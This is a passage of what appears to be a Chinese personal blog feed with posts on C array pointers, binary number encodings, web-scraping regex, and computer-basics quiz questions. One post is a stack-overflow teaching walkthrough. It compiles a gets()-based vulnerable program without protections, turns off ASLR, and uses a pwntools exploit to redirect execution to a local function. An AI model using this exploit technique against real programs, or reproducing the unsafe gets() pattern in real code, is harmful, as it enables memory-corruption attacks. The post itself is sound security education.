a+n</code>表示第n行的首地址。</p><p>2.<code>&amp;a[0][0]</code>既可以看做数组<code>0</code>行<code>0</code>列的首地址，同样可以看作是二维数组的首地址，<code>&amp;a[m][n]</code>就是第<code>m</code>行第<code>n</code>列元素的地址。</p><p>3.<code>&amp;a[0]</code>是第<code>0</code>行的首地址，<code>&amp;a[n]</code>就是第<code>n</code>行的首地址。</p><p>4.<code>a[0]+n</code>表示第<code>0</code>行的第<code>n</code>个元素的地址。</p><p>5.<code>*(*(a+n)+m)</code>表示第<code>n</code>行第<code>m</code>列的元素。</p><p>6.<code>*(a[n]+m)</code>表示第<code>n</code>行第<code>m</code>列的元素。</p>]]></content>
    
    
    <categories>
      
      <category>School Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>机器数</title>
    <link href="/2022/03/14/%E6%9C%BA%E5%99%A8%E6%95%B0/"/>
    <url>/2022/03/14/%E6%9C%BA%E5%99%A8%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="定义">定义</h2><p>连同数字和符号在一起的二进制数称为机器数，由机器数表示的实际值称为真值</p><h2 id="原码">原码</h2><h3 id="定义-2">定义</h3><p>一般一个字节是八个二进制位，对于机器数则有第一个二进制位是符号位，从第二个开始到最后一个二进制位则是表示数据的大小，即最大表示范围为<code>-127 ~ 127</code>，即最大数是<code>01111111</code>，最小数为<code>11111111</code></p><p><img src="https://static01.imgkr.com/temp/347e10cae73d44d1a36d96394bb5b5c3.png" alt=""></p><blockquote><p>其中第一个符号位是 1 则代表该数是一个负数，0 则是一个正数</p></blockquote><h3 id="原码表示（举例）">原码表示（举例）</h3><p>C语言中可以理解为一个八位二进制数</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[+78]</span> = <span class="hljs-number">01001110</span><br><span class="hljs-string">[-78]</span> = <span class="hljs-number">11001110</span><br></code></pre></td></tr></table></figure><h2 id="反码">反码</h2><h3 id="定义-3">定义</h3><p>正数的反码与原码相同，负数从第二位开始按位取反（二进制下）</p><h3 id="特殊">特殊</h3><p>同时任意一个数的反码的反码即是原码本身</p><p>零的反码表示有两种：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[+0]</span> = <span class="hljs-number">00000000</span><br><span class="hljs-string">[-0]</span> = <span class="hljs-number">11111111</span><br></code></pre></td></tr></table></figure><h3 id="反码表示（举例）">反码表示（举例）</h3><p>C语言中可以理解为一个八位二进制数的后七位进行位运算中的取反（<code>~</code>）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[+78]</span> = <span class="hljs-number">01001110</span><br><span class="hljs-string">[-78]</span> = <span class="hljs-number">10110001</span><br></code></pre></td></tr></table></figure><h2 id="补码">补码</h2><h3 id="定义-4">定义</h3><p>正数补码与原码相同，负数补码是对该数除符号位以外的各位取反，最末位加一。</p><h3 id="特殊-2">特殊</h3><p>任意数的补码的补码即原码本身，所以已知一个数的补码，求原码的操作其实就是对该补码再求补码。</p><p>零的补码唯一</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[+0]</span> = <span class="hljs-number">00000000</span><br><span class="hljs-string">[-0]</span> = <span class="hljs-number">00000000</span><br></code></pre></td></tr></table></figure><h3 id="补码表示（举例）">补码表示（举例）</h3><p>C语言中可以理解为一个八位二进制数的后七位进行位运算中的取反（<code>~</code>），同时对其第八位二进制数加一，第八位二进制数如果为 1 则进位处理</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[+78]</span> = <span class="hljs-number">01001110</span><br><span class="hljs-string">[-78]</span> = <span class="hljs-number">10110010</span><br></code></pre></td></tr></table></figure><h2 id=""></h2>]]></content>
    
    
    <categories>
      
      <category>School Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出</title>
    <link href="/2022/03/14/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/03/14/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p><ul><li><p>程序必须向栈上写入数据。</p></li><li><p>写入的数据大小没有被良好地控制。</p></li></ul><h2 id="基本原理">基本原理</h2><p>栈溢出通过控制输入的字符串长度，覆盖对应栈空间内的函数的返回地址，把原先返回地址更改为目标函数的地址而实现调用其他函数。</p><h2 id="基本示例">基本示例</h2><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">success</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Hava already controlled it.&quot;</span>); &#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vulnerable</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">12</span>];<br>  gets(s);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  vulnerable();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p><p>我们利用如下命令对其进行编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  <span class="hljs-built_in">stack</span>-example gcc -m32 -fno-<span class="hljs-built_in">stack</span>-protector stack_example.c -o stack_example <br>stack_example.c: In function ‘vulnerable’:<br>stack_example.c:<span class="hljs-number">6</span>:<span class="hljs-number">3</span>: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]<br>   gets(s);<br>   ^<br>/tmp/ccPU8rRA.o：在函数‘vulnerable’中：<br>stack_example.c:(.text+<span class="hljs-number">0x27</span>): 警告： the `gets<span class="hljs-number">&#x27;</span> function is dangerous <span class="hljs-keyword">and</span> should <span class="hljs-keyword">not</span> be used.<br></code></pre></td></tr></table></figure><p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p><p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p><p>编译成功后，我们可以使用 <code>checksec</code> 工具检查编译出的文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➜</span>  <span class="hljs-string">stack-example</span> <span class="hljs-string">checksec</span> <span class="hljs-string">stack_example</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p><ul><li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li><li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li><li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li></ul><p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p><p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 <code>vulnerable</code> 函数 。可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vulnerable</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [sp+4h] [bp-14h]@1</span><br><br>  gets(&amp;s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(&amp;s);<br>&#125;<br></code></pre></td></tr></table></figure><p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">             +-----------------+<br>             |<span class="hljs-string">     retaddr     </span>|<br>             +-----------------+<br>             |<span class="hljs-string">     saved ebp   </span>|<br>      ebp---&gt;+-----------------+<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure><p>并且，我们可以通过 IDA 获得 <code>success</code> 的地址，其地址为 <code>0x0804843B</code>。</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.text:<span class="hljs-number">0804843</span>B success         <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span><br>.text:0804843B<span class="hljs-title">                 push</span> <span class="hljs-title">   ebp</span><br>.text:0804843C<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebp,</span> esp<br>.text:0804843E<span class="hljs-title">                 sub</span> <span class="hljs-title">    esp,</span> 8<br>.text:08048441<span class="hljs-title">                 sub</span> <span class="hljs-title">    esp,</span> 0Ch<br>.text:08048444<span class="hljs-title">                 push</span> <span class="hljs-title">   offset</span> s        ; &quot;You<span class="hljs-title"> Hava</span> already<span class="hljs-title"> controlled</span> it.&quot;<br>.text:08048449<span class="hljs-title">                 call</span> <span class="hljs-title">   _puts</span><br>.text:0804844E<span class="hljs-title">                 add</span> <span class="hljs-title">    esp,</span> 10h<br>.text:08048451<span class="hljs-title">                 nop</span><br>.text:08048452<span class="hljs-title">                 leave</span><br>.text:08048453<span class="hljs-title">                 retn</span><br>.text:08048453<span class="hljs-title"> success</span> <span class="hljs-title">        endp</span><br></code></pre></td></tr></table></figure><p>那么如果我们读取的字符串为</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">0</span>x14*&#x27;a&#x27;+&#x27;bbbb&#x27;+success_addr<br></code></pre></td></tr></table></figure><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 <code>saved ebp</code> 覆盖为 <code>bbbb</code>，将 <code>retaddr</code> 覆盖为 <code>success_addr</code>，即，此时的栈结构为</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">             +-----------------+<br>             |<span class="hljs-string">    0x0804843B   </span>|<br>             +-----------------+<br>             |<span class="hljs-string">       bbbb      </span>|<br>      ebp---&gt;+-----------------+<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 <code>0x0804843B</code>在内存中的形式是</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">3</span>b\<span class="hljs-keyword">x</span><span class="hljs-number">84</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span><br></code></pre></td></tr></table></figure><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 <code>pwntools </code>，这里利用 <code>pwntools</code>的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">## 构造与程序交互的对象</span><br>sh = process(<span class="hljs-string">&#x27;./stack_example&#x27;</span>)<br>success_addr = <span class="hljs-number">0x0804843b</span><br><span class="hljs-comment">## 构造payload</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x14</span> + <span class="hljs-string">&#x27;bbbb&#x27;</span> + p32(success_addr)<br><span class="hljs-built_in">print</span> p32(success_addr)<br><span class="hljs-comment">## 向程序发送字符串</span><br>sh.sendline(payload)<br><span class="hljs-comment">## 将代码交互转换为手工交互</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>执行一波代码，可以得到</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">➜  stack-example python exp.py<br>[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./stack_example&#x27;</span>: pid 61936<br>;\x84\x0<br>[*] Switching to interactive mode<br>aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0<br>You Hava already controlled it.<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive<br>$ <br>[*] Process <span class="hljs-string">&#x27;./stack_example&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code -11 (SIGSEGV) (pid 61936)<br>[*] Got EOF <span class="hljs-keyword">while</span> sending <span class="hljs-keyword">in</span> interactive<br></code></pre></td></tr></table></figure><p>可以看到我们确实已经执行 success 函数。</p><h2 id="总结">总结</h2><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p><h3 id="寻找危险函数">寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h3 id="确定填充长度">确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式</title>
    <link href="/2022/03/14/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2022/03/14/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>Regular Expression, 正则表达式, ⼀种使⽤表达式的⽅式对字符串 进⾏匹配的语法规则. 我们抓取到的⽹⻚源代码本质上就是⼀个超⻓的字符串, 想从⾥⾯提 取内容.⽤正则再合适不过了. 正则的优点: 速度快, 效率⾼, 准确性⾼ 正则的缺点: 新⼿上⼿难度有 点⼉⾼. 不过只要掌握了正则编写的逻辑关系, 写出⼀个提取⻚⾯内容的正则 其实并不复杂 正则的语法: 使⽤元字符进⾏排列组合⽤来匹配字符串 在线测试正 则表达式https://tool.oschina.net/regex/</p><h2 id="常用元字符：具有固定含义的特殊符号">常用元字符：具有固定含义的特殊符号</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\w</span>     匹配字母数字下划线<br><span class="hljs-string">\d</span>     匹配数字<br><span class="hljs-string">\s</span>     匹配空白符<br><span class="hljs-string">\t</span>     匹配一个制表符<br><br>^      匹配字符串的开始<br>$      匹配字符串的结尾<br><br><span class="hljs-string">\W</span>     匹配非字母数字下划线<br><span class="hljs-string">\D</span>     匹配数字<br><span class="hljs-string">\S</span>     匹配空白符<br><br>a|b    匹配字符a或者b<br>()     匹配括号内的表达式，也表示一个组<br>[...]    匹配字符串中的字符<br>[^...]   匹配除了字符组中字符的所有字符<br></code></pre></td></tr></table></figure><h2 id="量词：控制前面元字符出现的次数">量词：控制前面元字符出现的次数</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs excel">*   重复零次或者更多次<br>+   重复一次或者多次<br>?   重复零次或者一次<br>&#123;<span class="hljs-built_in">n</span>&#125;   重复<span class="hljs-built_in">n</span>次<br>&#123;<span class="hljs-built_in">n</span>,&#125;       重复<span class="hljs-built_in">n</span>次或者更多次<br>&#123;<span class="hljs-built_in">n</span>,m&#125;   重复<span class="hljs-built_in">n</span>到m次<br></code></pre></td></tr></table></figure><h2 id="贪婪匹配和惰性匹配">贪婪匹配和惰性匹配</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">.<span class="hljs-emphasis">*贪婪匹配（尽可能多的匹配内容）</span><br><span class="hljs-emphasis">.*</span>?惰性匹配（尽可能少的匹配内容）<br></code></pre></td></tr></table></figure><h2 id="案例">案例</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html">案例 1<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;jay&quot;</span>&gt;</span>周杰伦<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;jj&quot;</span>&gt;</span>林俊杰<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>测试表达式<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;.*?&quot;</span>&gt;</span>.*?<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>测试结果<br>两处匹配<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;jay&quot;</span>&gt;</span>周杰伦<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;jj&quot;</span>&gt;</span>林俊杰<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html">案例 2<br>str: 玩⼉吃鸡游戏, 晚上⼀起上游戏, ⼲嘛呢? 打游戏啊<br>reg: 玩⼉.*?游戏<br>此时匹配的是: 玩⼉吃鸡游戏<br>reg: 玩⼉.*游戏 <br>此时匹配的是: 玩⼉吃鸡游戏, 晚上⼀起上游戏, ⼲嘛呢? 打游<br>戏 <br> <br> <br>str: <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>胡辣汤<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>reg: &lt;.*&gt;<br>结果: <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>胡辣汤<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>str: <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>胡辣汤<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>reg: &lt;.*?&gt;<br>结果:<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>str: <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>胡辣汤<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>饭团<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>reg: <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>.*?<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>结果:<br> <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>胡辣汤<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Website Spider</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>大学计算机基础</title>
    <link href="/2022/03/14/%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/03/14/%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="选择">选择</h2><p>1．一个完整的计算机系统包括____。<br>A)主机、键盘、显示器<br>B)计算机及其外部设备<br>C)系统软件与应用软件<br>D)计算机的硬件系统和软件系统</p><details><summary style='color:pink'>解答：</summary>    一个完整的计算机系统是由硬件系统和软件系统组成的。计算机的硬件是一个物质基础，而计算机软件是使硬件功能得以充分发挥的不可缺少的一部分。因此，对于一个完整的计算机系统，这两者缺一不可。本题的正确答案为D。</details><p>2．微型计算机的运算器、控制器及内存储器的总称是____。<br>A)CPU B)ALU C)MPU D)主机</p><details><summary style='color:pink'>解答：</summary>    CPU是中央处理器的简称，包括MPU和ALU；MPU是微处理器的简称；ALU是算术逻辑单元的简称；CPU和内存储器的总称为主机，它是微型机核心部分。本题正确答案为D。</details>3．“长城386微机”中的“386”指的是____。A)CPU的型号 B)CPU的速度 C)内存的容量 D)运算器的速度<details><summary style='color:pink'>解答：</summary>CPU的品质直接决定了微机的档次，在奔腾出现之前，微机名称中直接使用微机中的CPU型号，386机表示了它们使用的CPU芯片为80386。本题的正确答案为A。</details>4．在微型计算机中，微处理器的主要功能是进行____。A)算术逻辑运算及全机的控制B)逻辑运算C)算术逻辑运算D)算术运算<details><summary style='color:pink'>解答： </summary>微处理器是计算机一切活动的核心，它的主要功能是实现算术逻辑运算及全机的控制。 本题正确答案为A。</details> 5．反映计算机存储容量的基本单位是____。A)二进制位 B)字节 C)字 D)双字<details><summary style='color:pink'>解答： </summary>存储容量大小是计算机的基本技术指标之一。通常不是以二进制位、字或双字来表示，因为这些表示不规范，一般约定以字节作为反映存储容量大小的基本单位。本题正确答案为B。</details>6．在微机中，应用最普遍的字符编码是____。A)ASCII码 B)BCD码 C)汉字编码 D)补码<details><summary style='color:pink'>解答： </summary>字符编码是指对英文字母、符号和数字的编码，应用最广泛的是美国国家信息交换标准字符码，简称为ASCII码。BCD码是二—十进制编码。汉字编码是对汉字不同表示方法的各种汉字编码的总称。补码是带符号数的机器数的编码。本题正确答案为A。</details>7．DRAM存储器的中文含义是____。A)静态随机存储器B)动态只读存储器C)静态只读存储器D)动态随机存储器<details><summary style='color:pink'>解答： </summary>动态随机存储器的原文是(Dynamic Random AccessMemory：DRAM)。随机存储器有静态随机存储器和动态随机存储器之分。半导体动态随机存储器DRAM的存储速度快，存储容量大，价格比静态随机存储器便宜。通常所指的64MB或128MB内存，多为动态随机存储器DRAM。本题正确答案为D。</details>8．微型计算机的发展是以____的发展为表征的。A)微处理器 B)软件 C)主机 D)控制器<details><summary style='color:pink'>解答： 